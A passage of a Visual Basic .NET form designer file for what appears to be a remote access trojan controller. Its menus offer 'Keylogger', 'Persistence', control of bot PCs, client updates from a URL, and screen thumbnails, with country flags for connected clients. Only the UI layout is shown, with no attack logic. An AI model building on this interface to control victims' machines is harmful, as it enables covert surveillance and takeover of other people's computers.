        Me.KeyloggerToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.KeyloggerToolStripMenuItem.Name = "KeyloggerToolStripMenuItem"
        Me.KeyloggerToolStripMenuItem.Size = New System.Drawing.Size(247, 30)
        Me.KeyloggerToolStripMenuItem.Text = "Keylogger"
        '
        'PersistenceToolStripMenuItem
        '
        Me.PersistenceToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.PersistenceToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PersistenceToolStripMenuItem.Name = "PersistenceToolStripMenuItem"
        Me.PersistenceToolStripMenuItem.Size = New System.Drawing.Size(247, 30)
        Me.PersistenceToolStripMenuItem.Text = "Persistence"
        '
        'BotPCOptionsToolStripMenuItem
        '
        Me.BotPCOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PCRestartToolStripMenuItem, Me.PCShutdownToolStripMenuItem, Me.PCLogoutToolStripMenuItem})
        Me.BotPCOptionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.BotPCOptionsToolStripMenuItem.Name = "BotPCOptionsToolStripMenuItem"
        Me.BotPCOptionsToolStripMenuItem.Size = New System.Drawing.Size(215, 26)
        Me.BotPCOptionsToolStripMenuItem.Text = "PC Options"
        '
        'PCRestartToolStripMenuItem
        '
        Me.PCRestartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.PCRestartToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PCRestartToolStripMenuItem.Name = "PCRestartToolStripMenuItem"
        Me.PCRestartToolStripMenuItem.Size = New System.Drawing.Size(252, 30)
        Me.PCRestartToolStripMenuItem.Text = "PC Restart"
        '
        'PCShutdownToolStripMenuItem
        '
        Me.PCShutdownToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.PCShutdownToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PCShutdownToolStripMenuItem.Name = "PCShutdownToolStripMenuItem"
        Me.PCShutdownToolStripMenuItem.Size = New System.Drawing.Size(252, 30)
        Me.PCShutdownToolStripMenuItem.Text = "PC Shutdown"
        '
        'PCLogoutToolStripMenuItem
        '
        Me.PCLogoutToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.PCLogoutToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PCLogoutToolStripMenuItem.Name = "PCLogoutToolStripMenuItem"
        Me.PCLogoutToolStripMenuItem.Size = New System.Drawing.Size(252, 30)
        Me.PCLogoutToolStripMenuItem.Text = "PC Logout"
        '
        'ControllerOptionsToolStripMenuItem
        '
        Me.ControllerOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateToolStripMenuItem, Me.RestartToolStripMenuItem, Me.CloseToolStripMenuItem, Me.UninstallToolStripMenuItem})
        Me.ControllerOptionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.ControllerOptionsToolStripMenuItem.Name = "ControllerOptionsToolStripMenuItem"
        Me.ControllerOptionsToolStripMenuItem.Size = New System.Drawing.Size(215, 26)
        Me.ControllerOptionsToolStripMenuItem.Text = "Client Options"
        '
        'UpdateToolStripMenuItem
        '
        Me.UpdateToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.UpdateToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateDiskToolStripMenuItem, Me.UpdateFromURLToolStripMenuItem})
        Me.UpdateToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem"
        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(156, 30)
        Me.UpdateToolStripMenuItem.Text = "Update"
        '
        'UpdateDiskToolStripMenuItem
        '
        Me.UpdateDiskToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.UpdateDiskToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.UpdateDiskToolStripMenuItem.Name = "UpdateDiskToolStripMenuItem"
        Me.UpdateDiskToolStripMenuItem.Size = New System.Drawing.Size(167, 30)
        Me.UpdateDiskToolStripMenuItem.Text = "From Disk"
        '
        'UpdateFromURLToolStripMenuItem
        '
        Me.UpdateFromURLToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.UpdateFromURLToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.UpdateFromURLToolStripMenuItem.Name = "UpdateFromURLToolStripMenuItem"
        Me.UpdateFromURLToolStripMenuItem.Size = New System.Drawing.Size(167, 30)
        Me.UpdateFromURLToolStripMenuItem.Text = "From URL"
        '
        'RestartToolStripMenuItem
        '
        Me.RestartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.RestartToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
        Me.RestartToolStripMenuItem.Size = New System.Drawing.Size(156, 30)
        Me.RestartToolStripMenuItem.Text = "Restart"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.CloseToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(156, 30)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.UninstallToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(156, 30)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'ToolStripSeparator2
        '
        Me.ToolStripSeparator2.Name = "ToolStripSeparator2"
        Me.ToolStripSeparator2.Size = New System.Drawing.Size(212, 6)
        '
        'ListviewOptionsToolStripMenuItem
        '
        Me.ListviewOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ClientColorToolStripMenuItem1, Me.ClientNoteToolStripMenuItem, Me.ClientFolderToolStripMenuItem1, Me.RemoveOfflineToolStripMenuItem})
        Me.ListviewOptionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.ListviewOptionsToolStripMenuItem.Name = "ListviewOptionsToolStripMenuItem"
        Me.ListviewOptionsToolStripMenuItem.Size = New System.Drawing.Size(215, 26)
        Me.ListviewOptionsToolStripMenuItem.Text = "Listview Options"
        '
        'ClientColorToolStripMenuItem1
        '
        Me.ClientColorToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.ClientColorToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control
        Me.ClientColorToolStripMenuItem1.Name = "ClientColorToolStripMenuItem1"
        Me.ClientColorToolStripMenuItem1.Size = New System.Drawing.Size(205, 30)
        Me.ClientColorToolStripMenuItem1.Text = "Client Color"
        '
        'ClientNoteToolStripMenuItem
        '
        Me.ClientNoteToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.ClientNoteToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.ClientNoteToolStripMenuItem.Name = "ClientNoteToolStripMenuItem"
        Me.ClientNoteToolStripMenuItem.Size = New System.Drawing.Size(205, 30)
        Me.ClientNoteToolStripMenuItem.Text = "Client Note"
        '
        'ClientFolderToolStripMenuItem1
        '
        Me.ClientFolderToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.ClientFolderToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control
        Me.ClientFolderToolStripMenuItem1.Name = "ClientFolderToolStripMenuItem1"
        Me.ClientFolderToolStripMenuItem1.Size = New System.Drawing.Size(205, 30)
        Me.ClientFolderToolStripMenuItem1.Text = "Client Folder"
        '
        'RemoveOfflineToolStripMenuItem
        '
        Me.RemoveOfflineToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.RemoveOfflineToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RemoveOfflineToolStripMenuItem.Name = "RemoveOfflineToolStripMenuItem"
        Me.RemoveOfflineToolStripMenuItem.Size = New System.Drawing.Size(205, 30)
        Me.RemoveOfflineToolStripMenuItem.Text = "Remove Offline"
        '
        'ToolStripSeparator3
        '
        Me.ToolStripSeparator3.Name = "ToolStripSeparator3"
        Me.ToolStripSeparator3.Size = New System.Drawing.Size(212, 6)
        '
        'OnConnectToolStripMenuItem
        '
        Me.OnConnectToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.OnConnectToolStripMenuItem.Name = "OnConnectToolStripMenuItem"
        Me.OnConnectToolStripMenuItem.Size = New System.Drawing.Size(215, 26)
        Me.OnConnectToolStripMenuItem.Text = "On Connect"
        '
        'ToolStripSeparator4
        '
        Me.ToolStripSeparator4.Name = "ToolStripSeparator4"
        Me.ToolStripSeparator4.Size = New System.Drawing.Size(212, 6)
        '
        'AboutToolStripMenuItem
        '
        Me.AboutToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem"
        Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(215, 26)
        Me.AboutToolStripMenuItem.Text = "About"
        '
        'Flag
        '
        Me.Flag.ImageStream = CType(resources.GetObject("Flag.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.Flag.TransparentColor = System.Drawing.Color.Transparent
        Me.Flag.Images.SetKeyName(0, "_African Union(OAS).png")
        Me.Flag.Images.SetKeyName(1, "_Arab League.png")
        Me.Flag.Images.SetKeyName(2, "_ASEAN.png")
        Me.Flag.Images.SetKeyName(3, "_CARICOM.png")
        Me.Flag.Images.SetKeyName(4, "_CIS.png")
        Me.Flag.Images.SetKeyName(5, "_Commonwealth.png")
        Me.Flag.Images.SetKeyName(6, "_England.png")
        Me.Flag.Images.SetKeyName(7, "_European Union.png")
        Me.Flag.Images.SetKeyName(8, "_Islamic Conference.png")
        Me.Flag.Images.SetKeyName(9, "_Kosovo.png")
        Me.Flag.Images.SetKeyName(10, "_NATO.png")
        Me.Flag.Images.SetKeyName(11, "_Northern Ireland.png")
        Me.Flag.Images.SetKeyName(12, "_Olimpic Movement.png")
        Me.Flag.Images.SetKeyName(13, "_OPEC.png")
        Me.Flag.Images.SetKeyName(14, "_Red Cross.png")
        Me.Flag.Images.SetKeyName(15, "_Scotland.png")
        Me.Flag.Images.SetKeyName(16, "_Somaliland.png")
        Me.Flag.Images.SetKeyName(17, "_United Nations.png")
        Me.Flag.Images.SetKeyName(18, "_Wales.png")
        Me.Flag.Images.SetKeyName(19, "ad.png")
        Me.Flag.Images.SetKeyName(20, "ae.png")
        Me.Flag.Images.SetKeyName(21, "af.png")
        Me.Flag.Images.SetKeyName(22, "ag.png")
        Me.Flag.Images.SetKeyName(23, "ai.png")
        Me.Flag.Images.SetKeyName(24, "al.png")
        Me.Flag.Images.SetKeyName(25, "am.png")
        Me.Flag.Images.SetKeyName(26, "an.png")
        Me.Flag.Images.SetKeyName(27, "ao.png")
        Me.Flag.Images.SetKeyName(28, "aq.png")
        Me.Flag.Images.SetKeyName(29, "ar.png")
        Me.Flag.Images.SetKeyName(30, "as.png")
        Me.Flag.Images.SetKeyName(31, "at.png")
        Me.Flag.Images.SetKeyName(32, "au.png")
        Me.Flag.Images.SetKeyName(33, "aw.png")
        Me.Flag.Images.SetKeyName(34, "az.png")
        Me.Flag.Images.SetKeyName(35, "ba.png")
        Me.Flag.Images.SetKeyName(36, "bb.png")
        Me.Flag.Images.SetKeyName(37, "bd.png")
        Me.Flag.Images.SetKeyName(38, "be.png")
        Me.Flag.Images.SetKeyName(39, "bf.png")
        Me.Flag.Images.SetKeyName(40, "bg.png")
        Me.Flag.Images.SetKeyName(41, "bh.png")
        Me.Flag.Images.SetKeyName(42, "bi.png")
        Me.Flag.Images.SetKeyName(43, "bj.png")
        Me.Flag.Images.SetKeyName(44, "bm.png")
        Me.Flag.Images.SetKeyName(45, "bn.png")
        Me.Flag.Images.SetKeyName(46, "bo.png")
        Me.Flag.Images.SetKeyName(47, "br.png")
        Me.Flag.Images.SetKeyName(48, "bs.png")
        Me.Flag.Images.SetKeyName(49, "bt.png")
        Me.Flag.Images.SetKeyName(50, "bw.png")
        Me.Flag.Images.SetKeyName(51, "by.png")
        Me.Flag.Images.SetKeyName(52, "bz.png")
        Me.Flag.Images.SetKeyName(53, "ca.png")
        Me.Flag.Images.SetKeyName(54, "cd.png")
        Me.Flag.Images.SetKeyName(55, "cf.png")
        Me.Flag.Images.SetKeyName(56, "cg.png")
        Me.Flag.Images.SetKeyName(57, "ch.png")
        Me.Flag.Images.SetKeyName(58, "ci.png")
        Me.Flag.Images.SetKeyName(59, "ck.png")
        Me.Flag.Images.SetKeyName(60, "cl.png")
        Me.Flag.Images.SetKeyName(61, "cm.png")
        Me.Flag.Images.SetKeyName(62, "cn.png")
        Me.Flag.Images.SetKeyName(63, "co.png")
        Me.Flag.Images.SetKeyName(64, "cr.png")
        Me.Flag.Images.SetKeyName(65, "cu.png")
        Me.Flag.Images.SetKeyName(66, "cv.png")
        Me.Flag.Images.SetKeyName(67, "cy.png")
        Me.Flag.Images.SetKeyName(68, "cz.png")
        Me.Flag.Images.SetKeyName(69, "de.png")
        Me.Flag.Images.SetKeyName(70, "dj.png")
        Me.Flag.Images.SetKeyName(71, "dk.png")
        Me.Flag.Images.SetKeyName(72, "dm.png")
        Me.Flag.Images.SetKeyName(73, "do.png")
        Me.Flag.Images.SetKeyName(74, "dz.png")
        Me.Flag.Images.SetKeyName(75, "ec.png")
        Me.Flag.Images.SetKeyName(76, "ee.png")
        Me.Flag.Images.SetKeyName(77, "eg.png")
        Me.Flag.Images.SetKeyName(78, "eh.png")
        Me.Flag.Images.SetKeyName(79, "er.png")
        Me.Flag.Images.SetKeyName(80, "es.png")
        Me.Flag.Images.SetKeyName(81, "et.png")
        Me.Flag.Images.SetKeyName(82, "fi.png")
        Me.Flag.Images.SetKeyName(83, "fj.png")
        Me.Flag.Images.SetKeyName(84, "fm.png")
        Me.Flag.Images.SetKeyName(85, "fo.png")
        Me.Flag.Images.SetKeyName(86, "fr.png")
        Me.Flag.Images.SetKeyName(87, "ga.png")
        Me.Flag.Images.SetKeyName(88, "gb.png")
        Me.Flag.Images.SetKeyName(89, "gd.png")
        Me.Flag.Images.SetKeyName(90, "ge.png")
        Me.Flag.Images.SetKeyName(91, "gg.png")
        Me.Flag.Images.SetKeyName(92, "gh.png")
        Me.Flag.Images.SetKeyName(93, "gi.png")
        Me.Flag.Images.SetKeyName(94, "gl.png")
        Me.Flag.Images.SetKeyName(95, "gm.png")
        Me.Flag.Images.SetKeyName(96, "gn.png")
        Me.Flag.Images.SetKeyName(97, "gp.png")
        Me.Flag.Images.SetKeyName(98, "gq.png")
        Me.Flag.Images.SetKeyName(99, "gr.png")
        Me.Flag.Images.SetKeyName(100, "gt.png")
        Me.Flag.Images.SetKeyName(101, "gu.png")
        Me.Flag.Images.SetKeyName(102, "gw.png")
        Me.Flag.Images.SetKeyName(103, "gy.png")
        Me.Flag.Images.SetKeyName(104, "hk.png")
        Me.Flag.Images.SetKeyName(105, "hn.png")
        Me.Flag.Images.SetKeyName(106, "hr.png")
        Me.Flag.Images.SetKeyName(107, "ht.png")
        Me.Flag.Images.SetKeyName(108, "hu.png")
        Me.Flag.Images.SetKeyName(109, "id.png")
        Me.Flag.Images.SetKeyName(110, "ie.png")
        Me.Flag.Images.SetKeyName(111, "il.png")
        Me.Flag.Images.SetKeyName(112, "im.png")
        Me.Flag.Images.SetKeyName(113, "in.png")
        Me.Flag.Images.SetKeyName(114, "iq.png")
        Me.Flag.Images.SetKeyName(115, "ir.png")
        Me.Flag.Images.SetKeyName(116, "is.png")
        Me.Flag.Images.SetKeyName(117, "it.png")
        Me.Flag.Images.SetKeyName(118, "je.png")
        Me.Flag.Images.SetKeyName(119, "jm.png")
        Me.Flag.Images.SetKeyName(120, "jo.png")
        Me.Flag.Images.SetKeyName(121, "jp.png")
        Me.Flag.Images.SetKeyName(122, "ke.png")
        Me.Flag.Images.SetKeyName(123, "kg.png")
        Me.Flag.Images.SetKeyName(124, "kh.png")
        Me.Flag.Images.SetKeyName(125, "ki.png")
        Me.Flag.Images.SetKeyName(126, "km.png")
        Me.Flag.Images.SetKeyName(127, "kn.png")
        Me.Flag.Images.SetKeyName(128, "kp.png")
        Me.Flag.Images.SetKeyName(129, "kr.png")
        Me.Flag.Images.SetKeyName(130, "kw.png")
        Me.Flag.Images.SetKeyName(131, "ky.png")
        Me.Flag.Images.SetKeyName(132, "kz.png")
        Me.Flag.Images.SetKeyName(133, "la.png")
        Me.Flag.Images.SetKeyName(134, "lb.png")
        Me.Flag.Images.SetKeyName(135, "lc.png")
        Me.Flag.Images.SetKeyName(136, "li.png")
        Me.Flag.Images.SetKeyName(137, "lk.png")
        Me.Flag.Images.SetKeyName(138, "lr.png")
        Me.Flag.Images.SetKeyName(139, "ls.png")
        Me.Flag.Images.SetKeyName(140, "lt.png")
        Me.Flag.Images.SetKeyName(141, "lu.png")
        Me.Flag.Images.SetKeyName(142, "lv.png")
        Me.Flag.Images.SetKeyName(143, "ly.png")
        Me.Flag.Images.SetKeyName(144, "ma.png")
        Me.Flag.Images.SetKeyName(145, "mc.png")
        Me.Flag.Images.SetKeyName(146, "md.png")
        Me.Flag.Images.SetKeyName(147, "me.png")
        Me.Flag.Images.SetKeyName(148, "mg.png")
        Me.Flag.Images.SetKeyName(149, "mh.png")
        Me.Flag.Images.SetKeyName(150, "mk.png")
        Me.Flag.Images.SetKeyName(151, "ml.png")
        Me.Flag.Images.SetKeyName(152, "mm.png")
        Me.Flag.Images.SetKeyName(153, "mn.png")
        Me.Flag.Images.SetKeyName(154, "mo.png")
        Me.Flag.Images.SetKeyName(155, "mq.png")
        Me.Flag.Images.SetKeyName(156, "mr.png")
        Me.Flag.Images.SetKeyName(157, "ms.png")
        Me.Flag.Images.SetKeyName(158, "mt.png")
        Me.Flag.Images.SetKeyName(159, "mu.png")
        Me.Flag.Images.SetKeyName(160, "mv.png")
        Me.Flag.Images.SetKeyName(161, "mw.png")
        Me.Flag.Images.SetKeyName(162, "mx.png")
        Me.Flag.Images.SetKeyName(163, "my.png")
        Me.Flag.Images.SetKeyName(164, "mz.png")
        Me.Flag.Images.SetKeyName(165, "na.png")
        Me.Flag.Images.SetKeyName(166, "nc.png")
        Me.Flag.Images.SetKeyName(167, "ne.png")
        Me.Flag.Images.SetKeyName(168, "ng.png")
        Me.Flag.Images.SetKeyName(169, "ni.png")
        Me.Flag.Images.SetKeyName(170, "nl.png")
        Me.Flag.Images.SetKeyName(171, "no.png")
        Me.Flag.Images.SetKeyName(172, "np.png")
        Me.Flag.Images.SetKeyName(173, "nr.png")
        Me.Flag.Images.SetKeyName(174, "nz.png")
        Me.Flag.Images.SetKeyName(175, "om.png")
        Me.Flag.Images.SetKeyName(176, "pa.png")
        Me.Flag.Images.SetKeyName(177, "pe.png")
        Me.Flag.Images.SetKeyName(178, "pf.png")
        Me.Flag.Images.SetKeyName(179, "pg.png")
        Me.Flag.Images.SetKeyName(180, "ph.png")
        Me.Flag.Images.SetKeyName(181, "pk.png")
        Me.Flag.Images.SetKeyName(182, "pl.png")
        Me.Flag.Images.SetKeyName(183, "pr.png")
        Me.Flag.Images.SetKeyName(184, "ps.png")
        Me.Flag.Images.SetKeyName(185, "pt.png")
        Me.Flag.Images.SetKeyName(186, "pw.png")
        Me.Flag.Images.SetKeyName(187, "py.png")
        Me.Flag.Images.SetKeyName(188, "qa.png")
        Me.Flag.Images.SetKeyName(189, "re.png")
        Me.Flag.Images.SetKeyName(190, "ro.png")
        Me.Flag.Images.SetKeyName(191, "rs.png")
        Me.Flag.Images.SetKeyName(192, "ru.png")
        Me.Flag.Images.SetKeyName(193, "rw.png")
        Me.Flag.Images.SetKeyName(194, "sa.png")
        Me.Flag.Images.SetKeyName(195, "sb.png")
        Me.Flag.Images.SetKeyName(196, "sc.png")
        Me.Flag.Images.SetKeyName(197, "sd.png")
        Me.Flag.Images.SetKeyName(198, "se.png")
        Me.Flag.Images.SetKeyName(199, "sg.png")
        Me.Flag.Images.SetKeyName(200, "si.png")
        Me.Flag.Images.SetKeyName(201, "sk.png")
        Me.Flag.Images.SetKeyName(202, "sl.png")
        Me.Flag.Images.SetKeyName(203, "sm.png")
        Me.Flag.Images.SetKeyName(204, "sn.png")
        Me.Flag.Images.SetKeyName(205, "so.png")
        Me.Flag.Images.SetKeyName(206, "sr.png")
        Me.Flag.Images.SetKeyName(207, "st.png")
        Me.Flag.Images.SetKeyName(208, "sv.png")
        Me.Flag.Images.SetKeyName(209, "sy.png")
        Me.Flag.Images.SetKeyName(210, "sz.png")
        Me.Flag.Images.SetKeyName(211, "tc.png")
        Me.Flag.Images.SetKeyName(212, "td.png")
        Me.Flag.Images.SetKeyName(213, "tg.png")
        Me.Flag.Images.SetKeyName(214, "th.png")
        Me.Flag.Images.SetKeyName(215, "tj.png")
        Me.Flag.Images.SetKeyName(216, "tl.png")
        Me.Flag.Images.SetKeyName(217, "tm.png")
        Me.Flag.Images.SetKeyName(218, "tn.png")
        Me.Flag.Images.SetKeyName(219, "to.png")
        Me.Flag.Images.SetKeyName(220, "tr.png")
        Me.Flag.Images.SetKeyName(221, "tt.png")
        Me.Flag.Images.SetKeyName(222, "tv.png")
        Me.Flag.Images.SetKeyName(223, "tw.png")
        Me.Flag.Images.SetKeyName(224, "tz.png")
        Me.Flag.Images.SetKeyName(225, "ua.png")
        Me.Flag.Images.SetKeyName(226, "ug.png")
        Me.Flag.Images.SetKeyName(227, "us.png")
        Me.Flag.Images.SetKeyName(228, "uy.png")
        Me.Flag.Images.SetKeyName(229, "uz.png")
        Me.Flag.Images.SetKeyName(230, "va.png")
        Me.Flag.Images.SetKeyName(231, "vc.png")
        Me.Flag.Images.SetKeyName(232, "ve.png")
        Me.Flag.Images.SetKeyName(233, "vg.png")
        Me.Flag.Images.SetKeyName(234, "vi.png")
        Me.Flag.Images.SetKeyName(235, "vn.png")
        Me.Flag.Images.SetKeyName(236, "vu.png")
        Me.Flag.Images.SetKeyName(237, "ws.png")
        Me.Flag.Images.SetKeyName(238, "ye.png")
        Me.Flag.Images.SetKeyName(239, "za.png")
        Me.Flag.Images.SetKeyName(240, "zm.png")
        Me.Flag.Images.SetKeyName(241, "zw.png")
        Me.Flag.Images.SetKeyName(242, "--.png")
        '
        'MetroTabPage4
        '
        Me.MetroTabPage4.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.MetroTabPage4.Controls.Add(Me.CAPsec)
        Me.MetroTabPage4.Controls.Add(Me.Label2)
        Me.MetroTabPage4.Controls.Add(Me.Label1)
        Me.MetroTabPage4.Controls.Add(Me.CAPstart)
        Me.MetroTabPage4.Controls.Add(Me.L3)
        Me.MetroTabPage4.ForeColor = System.Drawing.SystemColors.Control
        Me.MetroTabPage4.HorizontalScrollbarBarColor = True
        Me.MetroTabPage4.Location = New System.Drawing.Point(4, 42)
        Me.MetroTabPage4.Name = "MetroTabPage4"
        Me.MetroTabPage4.Size = New System.Drawing.Size(1614, 501)
        Me.MetroTabPage4.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroTabPage4.TabIndex = 3
        Me.MetroTabPage4.Text = "Thumbnail"
        Me.MetroTabPage4.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroTabPage4.VerticalScrollbarBarColor = True
        '
        'CAPsec
        '
        Me.CAPsec.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.CAPsec.ForeColor = System.Drawing.SystemColors.Control
        Me.CAPsec.Location = New System.Drawing.Point(277, 57)
        Me.CAPsec.Minimum = New Decimal(New Integer() {3, 0, 0, 0})
        Me.CAPsec.Name = "CAPsec"
        Me.CAPsec.Size = New System.Drawing.Size(59, 26)
        Me.CAPsec.TabIndex = 12
        Me.CAPsec.Value = New Decimal(New Integer() {5, 0, 0, 0})
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(354, 59)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(64, 20)
        Me.Label2.TabIndex = 11
        Me.Label2.Text = "Second"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(191, 59)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(66, 20)
        Me.Label1.TabIndex = 10
        Me.Label1.Text = "Refresh"
        '
        'CAPstart
        '
        Me.CAPstart.Location = New System.Drawing.Point(8, 33)
        Me.CAPstart.Name = "CAPstart"
        Me.CAPstart.Size = New System.Drawing.Size(158, 46)
        Me.CAPstart.Style = MetroFramework.MetroColorStyle.Lime
        Me.CAPstart.TabIndex = 7
        Me.CAPstart.Text = "START"
        Me.CAPstart.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'L3
        '
        Me.L3.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.L3.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.L3.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.L3.ForeColor = System.Drawing.SystemColors.Control
        Me.L3.LargeImageList = Me.ImageList1
        Me.L3.Location = New System.Drawing.Point(24, 107)
        Me.L3.Name = "L3"
        Me.L3.Size = New System.Drawing.Size(1272, 371)
        Me.L3.TabIndex = 2
        Me.L3.UseCompatibleStateImageBehavior = False
        '
        'ImageList1
        '
        Me.ImageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit
        Me.ImageList1.ImageSize = New System.Drawing.Size(256, 156)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        '
        'MetroTabPage2
        '
        Me.MetroTabPage2.Controls.Add(Me.L2)
        Me.MetroTabPage2.HorizontalScrollbarBarColor = True
        Me.MetroTabPage2.Location = New System.Drawing.Point(4, 42)
        Me.MetroTabPage2.Name = "MetroTabPage2"
        Me.MetroTabPage2.Size = New System.Drawing.Size(1614, 501)
        Me.MetroTabPage2.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroTabPage2.TabIndex = 1
        Me.MetroTabPage2.Text = "Logs"
        Me.MetroTabPage2.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroTabPage2.VerticalScrollbarBarColor = True
        '
        'L2
        '
        Me.L2.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.L2.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.L2.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.L2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.L2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.L2.FormattingEnabled = True
        Me.L2.ItemHeight = 20
        Me.L2.Location = New System.Drawing.Point(3, 23)
        Me.L2.Name = "L2"
        Me.L2.Size = New System.Drawing.Size(1603, 420)
        Me.L2.TabIndex = 2
        '
        'MetroTabPage3
        '
        Me.MetroTabPage3.Controls.Add(Me.chkRename)
        Me.MetroTabPage3.Controls.Add(Me.radioNET4)
        Me.MetroTabPage3.Controls.Add(Me.radioNET2)
        Me.MetroTabPage3.Controls.Add(Me.MetroButton1)
        Me.MetroTabPage3.Controls.Add(Me.MetroPanel5)
        Me.MetroTabPage3.Controls.Add(Me.MetroPanel4)
